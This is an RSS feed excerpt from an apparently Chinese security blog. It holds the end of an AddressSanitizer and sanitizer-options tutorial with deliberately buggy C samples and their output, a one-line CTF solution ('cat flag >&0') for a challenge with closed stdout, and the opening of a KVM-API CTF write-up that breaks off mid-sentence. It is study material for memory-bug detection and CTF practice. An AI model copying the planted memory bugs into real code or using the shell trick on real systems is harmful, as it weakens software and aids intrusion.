00</span></span><br><span class="line"><span class="meta">  0x10004cf00d40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span></span><br><span class="line"><span class="meta">=&gt;0x10004cf00d50: 00 00 00 00 00 00 00 00 00 00[f4</span>]f4 f3 f3 f3 f3</span><br><span class="line">  <span class="number">0x10004cf00d60</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x10004cf00d70</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x10004cf00d80</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x10004cf00d90</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x10004cf00da0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="function">Shadow <span class="built_in">byte</span> <span class="title">legend</span> (<span class="params">one shadow <span class="built_in">byte</span> represents <span class="number">8</span> application bytes</span>):</span></span><br><span class="line"><span class="function">  Addressable:           00</span></span><br><span class="line"><span class="function">  Partially addressable: 01 02 03 04 05 06 07 </span></span><br><span class="line"><span class="function">  Heap left redzone:       fa</span></span><br><span class="line"><span class="function">  Heap right redzone:      fb</span></span><br><span class="line"><span class="function">  Freed heap region:       fd</span></span><br><span class="line"><span class="function">  Stack left redzone:      f1</span></span><br><span class="line"><span class="function">  Stack mid redzone:       f2</span></span><br><span class="line"><span class="function">  Stack right redzone:     f3</span></span><br><span class="line"><span class="function">  Stack <span class="keyword">partial</span> redzone:   f4</span></span><br><span class="line"><span class="function">  Stack after <span class="keyword">return</span>:      f5</span></span><br><span class="line"><span class="function">  Stack use after scope:   f8</span></span><br><span class="line"><span class="function">  Global redzone:          f9</span></span><br><span class="line"><span class="function">  Global <span class="keyword">init</span> order:       f6</span></span><br><span class="line"><span class="function">  Poisoned <span class="keyword">by</span> user:        f7</span></span><br><span class="line"><span class="function">  Container overflow:      fc</span></span><br><span class="line"><span class="function">  Array cookie:            ac</span></span><br><span class="line"><span class="function">  Intra <span class="built_in">object</span> redzone:    bb</span></span><br><span class="line"><span class="function">  ASan <span class="keyword">internal</span>:           fe</span></span><br><span class="line"><span class="function"></span>==<span class="number">5077</span>==ABORTING</span><br></pre></td></tr></table></figure><h3 id="Global-buffer-overflow"><a href="#Global-buffer-overflow" class="headerlink" title="Global-buffer-overflow"></a>Global-buffer-overflow</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> global_array[<span class="number">100</span>] = &#123;<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> global_array[argc + <span class="number">100</span>];  <span class="comment">// BOOM</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc -g -o global_buffer_overflow -fsanitize=address -lasan -fuse-ld=gold global_overflow.c</code></p><p><code>LD_PRELOAD=$&#123;LD_PRELOAD&#125;:/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so   ./global_buffer_overflow</code></p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">=================================================================</span><br><span class="line">==<span class="number">5117</span>==ERROR: AddressSanitizer: <span class="keyword">global</span>-buffer-overflow <span class="keyword">on</span> address <span class="number">0x0000004021f4</span> at pc <span class="number">0x00000040080c</span> bp <span class="number">0x7fff85f8aaf0</span> sp <span class="number">0x7fff85f8aae0</span></span><br><span class="line">READ of size <span class="number">4</span> at <span class="number">0x0000004021f4</span> thread T0</span><br><span class="line">    <span class="meta">#0 0x40080b in main /home/c7/桌面/asan/global_buffer_overflow.c:3</span></span><br><span class="line">    <span class="meta">#1 0x7fd4153e383f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line">    <span class="meta">#2 0x4006e8 in _start (/home/c7/桌面/asan/global_buffer_overflow+0x4006e8)</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x0000004021f4</span> <span class="keyword">is</span> located <span class="number">4</span> bytes to the right of <span class="keyword">global</span> variable <span class="string">&#x27;global_array&#x27;</span> defined <span class="keyword">in</span> <span class="string">&#x27;global_buffer_overflow.c:1:5&#x27;</span> (<span class="number">0x402060</span>) of size <span class="number">400</span></span><br><span class="line">SUMMARY: AddressSanitizer: <span class="keyword">global</span>-buffer-overflow /home/c7/桌面/asan/global_buffer_overflow.c:<span class="number">3</span> main</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  <span class="number">0x0000800783e0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0000800783f0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x000080078400</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x000080078410</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x000080078420</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">=&gt;<span class="number">0x000080078430</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>[f9]f9</span><br><span class="line">  <span class="number">0x000080078440</span>: f9 f9 f9 f9 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x000080078450</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x000080078460</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x000080078470</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x000080078480</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="function">Shadow <span class="built_in">byte</span> <span class="title">legend</span> (<span class="params">one shadow <span class="built_in">byte</span> represents <span class="number">8</span> application bytes</span>):</span></span><br><span class="line"><span class="function">  Addressable:           00</span></span><br><span class="line"><span class="function">  Partially addressable: 01 02 03 04 05 06 07 </span></span><br><span class="line"><span class="function">  Heap left redzone:       fa</span></span><br><span class="line"><span class="function">  Heap right redzone:      fb</span></span><br><span class="line"><span class="function">  Freed heap region:       fd</span></span><br><span class="line"><span class="function">  Stack left redzone:      f1</span></span><br><span class="line"><span class="function">  Stack mid redzone:       f2</span></span><br><span class="line"><span class="function">  Stack right redzone:     f3</span></span><br><span class="line"><span class="function">  Stack <span class="keyword">partial</span> redzone:   f4</span></span><br><span class="line"><span class="function">  Stack after <span class="keyword">return</span>:      f5</span></span><br><span class="line"><span class="function">  Stack use after scope:   f8</span></span><br><span class="line"><span class="function">  Global redzone:          f9</span></span><br><span class="line"><span class="function">  Global <span class="keyword">init</span> order:       f6</span></span><br><span class="line"><span class="function">  Poisoned <span class="keyword">by</span> user:        f7</span></span><br><span class="line"><span class="function">  Container overflow:      fc</span></span><br><span class="line"><span class="function">  Array cookie:            ac</span></span><br><span class="line"><span class="function">  Intra <span class="built_in">object</span> redzone:    bb</span></span><br><span class="line"><span class="function">  ASan <span class="keyword">internal</span>:           fe</span></span><br><span class="line"><span class="function"></span>==<span class="number">5117</span>==ABORTING</span><br></pre></td></tr></table></figure><p>关于相关漏洞检测还有use after return、use after scope、initializations order bugs、memory leaks，可自行举例测试。</p><p>除了<strong>-fsanitize=address</strong>外，还有一些其他的编译选项检测功能。</p><h3 id="fsanitize-kernel-address"><a href="#fsanitize-kernel-address" class="headerlink" title="-fsanitize=kernel-address"></a>-fsanitize=kernel-address</h3><p>内核态内存错误检测器</p><h3 id="fsanitize-thread"><a href="#fsanitize-thread" class="headerlink" title="-fsanitize=thread"></a>-fsanitize=thread</h3><p>使能ThreadSanitizer，快速数据竞争检测。</p><p>这里使用的应该是TSAN，不是ASAN。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> Global;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">Thread1</span><span class="params">(<span class="keyword">void</span> *x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Global = <span class="number">42</span>;<span class="comment">//访问内存资源</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">Thread2</span><span class="params">(<span class="keyword">void</span> *x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Global = <span class="number">43</span>;<span class="comment">//访问内存资源</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> t[<span class="number">2</span>];</span><br><span class="line">    pthread_create(&amp;t[<span class="number">0</span>], <span class="literal">NULL</span>, Thread1, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;t[<span class="number">1</span>], <span class="literal">NULL</span>, Thread2, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(t[<span class="number">0</span>], <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(t[<span class="number">1</span>], <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc -g -o data_race -fsanitize=thread -ltsan -fuse-ld=gold data_race.c</code><br><code>./data_race</code></p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">==================</span><br><span class="line">WARNING: ThreadSanitizer: <span class="function">data <span class="title">race</span> (<span class="params">pid=<span class="number">5172</span></span>)</span></span><br><span class="line"><span class="function">  Write of size 4 at 0x000000402064 <span class="keyword">by</span> thread T2:    <span class="comment">//线程T2访问了冲突的资源</span></span></span><br><span class="line"><span class="function">    #0 Thread2 /home/c7/桌面/asan/data_race.c:13 (<span class="params">data_race+<span class="number">0x000000400959</span></span>) <span class="comment">//访问内存资源</span></span></span><br><span class="line"><span class="function">    #1 &lt;<span class="literal">null</span>&gt; &lt;<span class="literal">null</span>&gt; (<span class="params">libtsan.so<span class="number">.0</span>+<span class="number">0x0000000230d9</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  Previous write of size 4 at 0x000000402064 <span class="keyword">by</span> thread T1:   <span class="comment">//线程T1访问了冲突的资源</span></span></span><br><span class="line"><span class="function">    #0 Thread1 /home/c7/桌面/asan/data_race.c:7 (<span class="params">data_race+<span class="number">0x000000400918</span></span>)  <span class="comment">//访问冲突资源</span></span></span><br><span class="line"><span class="function">    #1 &lt;<span class="literal">null</span>&gt; &lt;<span class="literal">null</span>&gt; (<span class="params">libtsan.so<span class="number">.0</span>+<span class="number">0x0000000230d9</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  Location <span class="keyword">is</span> <span class="keyword">global</span> &#x27;Global&#x27; of size 4 at 0<span class="title">x000000402064</span> (<span class="params">data_race+<span class="number">0x000000402064</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  Thread <span class="title">T2</span> (<span class="params">tid=<span class="number">5175</span>, running</span>) created <span class="keyword">by</span> main thread at:    <span class="comment">//创建T2的调用栈</span></span></span><br><span class="line"><span class="function">    #0 <span class="title">pthread_create</span> &lt;<span class="literal">null</span>&gt; (<span class="params">libtsan.so<span class="number">.0</span>+<span class="number">0x000000027577</span></span>)</span></span><br><span class="line"><span class="function">    #1 main /home/c7/桌面/asan/data_race.c:21 (<span class="params">data_race+<span class="number">0x0000004009d5</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  Thread <span class="title">T1</span> (<span class="params">tid=<span class="number">5174</span>, finished</span>) created <span class="keyword">by</span> main thread at: <span class="comment">//创建T1的调用栈</span></span></span><br><span class="line"><span class="function">    #0 <span class="title">pthread_create</span> &lt;<span class="literal">null</span>&gt; (<span class="params">libtsan.so<span class="number">.0</span>+<span class="number">0x000000027577</span></span>)</span></span><br><span class="line"><span class="function">    #1 main /home/c7/桌面/asan/data_race.c:20 (<span class="params">data_race+<span class="number">0x0000004009b6</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">SUMMARY: ThreadSanitizer: data race /home/c7/桌面/asan/data_race.c:13 Thread2</span></span><br><span class="line"><span class="function"></span>==================</span><br><span class="line"></span><br><span class="line">ThreadSanitizer: reported <span class="number">1</span> warnings</span><br></pre></td></tr></table></figure><h3 id="fsanitize-leak"><a href="#fsanitize-leak" class="headerlink" title="-fsanitize=leak"></a>-fsanitize=leak</h3><p>使能LeakSanitizer，内存泄露检测，作用于链接阶段。只有当-fsanitize=address和-fsanitize=thread均不使能时才有效。<strong>没有-fsanitize=address功能全面，只做内存泄露检测，但是速度比-fsanitize=address要快</strong>。</p><p>内存泄露检查-fsanitize=leak只有在GCC版本≥4.9时才有效。</p><h3 id="fsanitize-undefined"><a href="#fsanitize-undefined" class="headerlink" title="-fsanitize=undefined"></a>-fsanitize=undefined</h3><p>运行时快速未定义行为检测器。包括如下6~22共17个子选项。</p><h3 id="fsanitize-shift"><a href="#fsanitize-shift" class="headerlink" title="-fsanitize=shift"></a>-fsanitize=shift</h3><p>移位操作符的移位大小超过了位宽或者小于零，或者左边是负值。 对于有符号数移位, 检查C中的有符号溢出，在C++中检查无符号溢出。</p><h3 id="fsanitize-integer-divide-by-zero"><a href="#fsanitize-integer-divide-by-zero" class="headerlink" title="-fsanitize=integer-divide-by-zero"></a>-fsanitize=integer-divide-by-zero</h3><p>整数除零。</p><h3 id="fsanitize-unreachable"><a href="#fsanitize-unreachable" class="headerlink" title="-fsanitize=unreachable"></a>-fsanitize=unreachable</h3><p>如果控制流到达 __builtin_unreachable。</p><h3 id="fsanitize-vla-bound"><a href="#fsanitize-vla-bound" class="headerlink" title="-fsanitize=vla-bound"></a>-fsanitize=vla-bound</h3><p>可变长数组边界值非正。</p><h3 id="fsanitize-null"><a href="#fsanitize-null" class="headerlink" title="-fsanitize=null"></a>-fsanitize=null</h3><p>使用一个空指针或者创建一个空引用。</p><h3 id="fsanitize-return"><a href="#fsanitize-return" class="headerlink" title="-fsanitize=return"></a>-fsanitize=return</h3><p><strong>仅C++有效</strong>，对函数返回值进行检查，定义了返回值为非空的函数如果未返回有效值将会报错。</p><h3 id="fsanitize-signed-integer-overflow"><a href="#fsanitize-signed-integer-overflow" class="headerlink" title="-fsanitize=signed-integer-overflow"></a>-fsanitize=signed-integer-overflow</h3><p>有符号整数溢出, 包含所有通过 -ftrapv 添加的检查, 并且检查有符号除法溢出 (INT_MIN / -1)。</p><h3 id="fsanitize-bounds"><a href="#fsanitize-bounds" class="headerlink" title="-fsanitize=bounds"></a>-fsanitize=bounds</h3><p>数组索引越界, 以防数组边界可以静态检测。</p><h3 id="fsanitize-alignment"><a href="#fsanitize-alignment" class="headerlink" title="-fsanitize=alignment"></a>-fsanitize=alignment</h3><p>使用一个未对齐的指针或者引用。</p><h3 id="fsanitize-object-size"><a href="#fsanitize-object-size" class="headerlink" title="-fsanitize=object-size"></a>-fsanitize=object-size</h3><p>尝试使用优化器可以探测到不属于访问对象的字节。 对象的大小使用 __builtin_object_size 检测, 并且结果可能会探测到多个问题在高层次的优化。</p><h3 id="fsanitize-float-divide-by-zero"><a href="#fsanitize-float-divide-by-zero" class="headerlink" title="-fsanitize=float-divide-by-zero"></a>-fsanitize=float-divide-by-zero</h3><p>浮点除零。不能被-fsanitize=undefined使能。</p><h3 id="fsanitize-float-cast-overflow"><a href="#fsanitize-float-cast-overflow" class="headerlink" title="-fsanitize=float-cast-overflow"></a>-fsanitize=float-cast-overflow</h3><p>浮点到整形转换的检查，不能被-fsanitize=undefined使能。</p><h3 id="fsanitize-nonnull-attribute"><a href="#fsanitize-nonnull-attribute" class="headerlink" title="-fsanitize=nonnull-attribute"></a>-fsanitize=nonnull-attribute</h3><p>对使用<strong>attribute</strong> nonnull限定参数非空的函数进行检查。</p><h3 id="fsanitize-returns-nonnull-attribute"><a href="#fsanitize-returns-nonnull-attribute" class="headerlink" title="-fsanitize=returns-nonnull-attribute"></a>-fsanitize=returns-nonnull-attribute</h3><p>对使用<strong>attribute</strong>((returns_nonnull))限定返回为非空指针的函数进行检测。</p><h3 id="fsanitize-bool"><a href="#fsanitize-bool" class="headerlink" title="-fsanitize=bool"></a>-fsanitize=bool</h3><p>加载一个既不是真也不是假的bool值。</p><h3 id="fsanitize-enum"><a href="#fsanitize-enum" class="headerlink" title="-fsanitize=enum"></a>-fsanitize=enum</h3><p>加载一个枚举类型的值，但是值不在那个枚举类型范围内。</p><h3 id="fsanitize-vptr"><a href="#fsanitize-vptr" class="headerlink" title="-fsanitize=vptr"></a>-fsanitize=vptr</h3><p>使用一个vptr预示着具有错误动态类型的对象，或者它的生命长度还未开始或者已经结束。与 -fno-rtti 兼容。</p><h3 id="fno-sanitize-all"><a href="#fno-sanitize-all" class="headerlink" title="-fno-sanitize=all"></a>-fno-sanitize=all</h3><p>禁止之前所有的子选项，-fsanitize=all是不能使用的，因某些子选项是不兼容的。</p><h3 id="fasan-shadow-offset-number"><a href="#fasan-shadow-offset-number" class="headerlink" title="-fasan-shadow-offset=number"></a>-fasan-shadow-offset=number</h3><p>自定义AddressSanitizer检查中的shadow偏移。</p><h3 id="fsanitize-recover-opts"><a href="#fsanitize-recover-opts" class="headerlink" title="-fsanitize-recover[=opts]"></a>-fsanitize-recover[=opts]</h3><p>使用逗号分隔的列表控制错误恢复模式。如：-fsanitize-recover=undefined,float-cast-overflow,float-divide-by-zero</p><p>-fno-sanitize-recover等同于</p><p>-fno-sanitize-recover=undefined,float-cast-overflow,float-divide-by-zero。</p><h3 id="fsanitize-undefined-trap-on-error"><a href="#fsanitize-undefined-trap-on-error" class="headerlink" title="-fsanitize-undefined-trap-on-error"></a>-fsanitize-undefined-trap-on-error</h3><p>控制编译器用using __builtin_trap替代libubsan报告未定义行为。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://bbs.huaweicloud.com/blogs/100056">https://bbs.huaweicloud.com/blogs/100056</a></p><p><a href="https://blog.csdn.net/wads23456/article/details/104842189/?utm_medium=distribute.pc_relevant.none-task-blog-title-1&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/wads23456/article/details/104842189/?utm_medium=distribute.pc_relevant.none-task-blog-title-1&amp;spm=1001.2101.3001.4242</a></p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/01/22/%E3%80%90ASAN%E3%80%91%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[WUSTCTF]closed</title>
      <link>https://billyotry.github.io/2021/01/22/[WUSTCTF]closed/</link>
      <guid>https://billyotry.github.io/2021/01/22/[WUSTCTF]closed/</guid>
      <pubDate>Thu, 21 Jan 2021 16:59:43 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;标准输出流全关了，需要将&lt;code&gt;stdout&lt;/code&gt;重定向到&lt;code&gt;stdin&lt;/code&gt;就行了。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;cat flag &amp;gt;&amp;amp;0&lt;/code&gt; 或 &lt;code&gt;exec 1&amp;gt;&amp;amp;0&lt;/code&gt;&lt;/p&gt;

        
      
      </description>
      
      
      <content:encoded><![CDATA[<p>标准输出流全关了，需要将<code>stdout</code>重定向到<code>stdin</code>就行了。</p><p><code>cat flag &gt;&amp;0</code> 或 <code>exec 1&gt;&amp;0</code></p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/01/22/[WUSTCTF]closed/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[Confidence CTF]kvm</title>
      <link>https://billyotry.github.io/2021/01/22/[Confidence%20CTF]kvm/</link>
      <guid>https://billyotry.github.io/2021/01/22/[Confidence%20CTF]kvm/</guid>
      <pubDate>Thu, 21 Jan 2021 16:59:43 GMT</pubDate>
      <description>
      
        
        
          &lt;h1 id=&quot;Confidence2020-CTF-KVM&quot;&gt;&lt;a href=&quot;#Confidence2020-CTF-KVM&quot; class=&quot;headerlink&quot; title=&quot;Confidence2020 CTF KVM&quot;&gt;&lt;/a&gt;Confidence2020 CTF K
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h1 id="Confidence2020-CTF-KVM"><a href="#Confidence2020-CTF-KVM" class="headerlink" title="Confidence2020 CTF KVM"></a>Confidence2020 CTF KVM</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>参考链接：<a href="https://lwn.net/Articles/658511/">https://lwn.net/Articles/658511/</a></p><h3 id="构建虚拟机"><a href="#构建虚拟机" class="headerlink" title="构建虚拟机"></a>构建虚拟机</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kvm = open(<span class="string">&quot;/dev/kvm&quot;</span>, O_RDWR | O_CLOEXEC);</span><br></pre></td></tr></table></figure><p>我们需要对设备的读写访问来设置虚拟机，并且所有打开不是明确打算跨<code>exec</code>继承的，应使用 <code>O_CLOEXEC</code>。</p><h3 id="创建一个虚拟机"><a href="#创建一个虚拟机" class="headerlink" title="创建一个虚拟机"></a>创建一个虚拟机</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">vmfd = ioctl(kvm, KVM_CREATE_VM, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>现在创建一个虚拟机，它代表与模拟出来的系统所有相关联的内容，包括内存，一或多个CPU。</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">int ioctl(int fd, ind cmd, …)； </span><br></pre></td></tr></table></figure><p><strong>ioctl</strong> 是设备驱动程序中对设备I/O通道进行管理的函数。所谓对I/O通道进行管理，就是对设备的一些特性进行控制，例如串口的传输波特率、马达的转速等等。</p><ul><li><strong>fd</strong> 是用户程序打开设备时使用<strong>open函数返回的文件标示符</strong>。</li><li><strong>cmd</strong> 是用户程序对设备的控制命令。</li><li><strong>省略号</strong>是一些补充参数，一般最多一个，这个参数的有无和cmd的意义相关。</li></ul><h3 id="分配内存"><a href="#分配内存" class="headerlink" title="分配内存"></a>分配内存</h3><p>现在虚拟机需要分配一些内存。<strong>分配的内存就相当于虚拟机的物理内存</strong>，为了提高性能，我们不想捕获所有对于内存的访问并且模拟的返回它对应的地址；相反的是，当虚拟CPU试图访问内存的时候，CPU的硬件虚拟化会首先对尝试通过设置的内存页表来满足对内存的访问，如果失败了（由于虚拟机访问的是”物理”地址，而内存没有映射到该地址），那么内核就会使用KVM API 来处理这个访问，例如通过模拟内存映射的I/O设备或者产生一个错误。</p><p>对于我们的例子，我们分配了单独的页来存放我们的代码，使用mmap()直接获得初始化为0的页面对齐的内存</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mem = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>我们需要复制我们的机器代码到这个分配的空间内：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(mem, code, <span class="keyword">sizeof</span>(code));</span><br></pre></td></tr></table></figure><p>然后告诉虚拟机它有足够大的4096个字节的内存：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kvm_userspace_memory_region</span> <span class="title">region</span> =</span> &#123;</span><br><span class="line">.slot = <span class="number">0</span>,</span><br><span class="line">.guest_phys_addr = <span class="number">0x1000</span>,</span><br><span class="line">.memory_size = <span class="number">0x1000</span>,</span><br><span class="line">.userspace_addr = (<span class="keyword">uint64_t</span>)mem,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ioctl(vmfd, KVM_SET_USER_MEMORY_REGION, &amp;region);</span><br></pre></td></tr></table></figure><ul><li><strong>slot</strong> 字段提供了一个整数索引，用于标识我们要移交给KVM的每个内存区域，再次使用相同的 slot 调用KVM_SET_USER_MEMORY_REGION将替换此映射，如果使用不同的 slot 就会创建一个新的单独的映射。</li><li><strong>guest_phys_addr</strong> 字段指定物理地址的基址。</li><li><strong>memory_size</strong> 字段指定我们要分配多大的内存。</li><li><strong>userspace_addr</strong> 字段指向我们使用mmap() 分配的后备内存，需要注意的是这个值总是64位的即使在32位平台上也是64位的，还有一点就是这里要求 mem 是页对齐的，这也就是为什么上面mmap的时候要分配一个页对齐的页。 </li></ul><h3 id="创建虚拟CPU"><a href="#创建虚拟CPU" class="headerlink" title="创建虚拟CPU"></a>创建虚拟CPU</h3><p>现在我们有一个VM并且VM中包含我们的代码，并且代码正等待运行，所以我们需要一个虚拟CPU来运行代码，KVM的虚拟CPU代表模拟CPU的状态，包括进程寄存器和其他的执行状态。</p><p>同样，KVM以文件描述符的形式为我们提供该VCPU的句柄：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">vcpufd = ioctl(vmfd, KVM_CREATE_VCPU, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>第三个参数 0 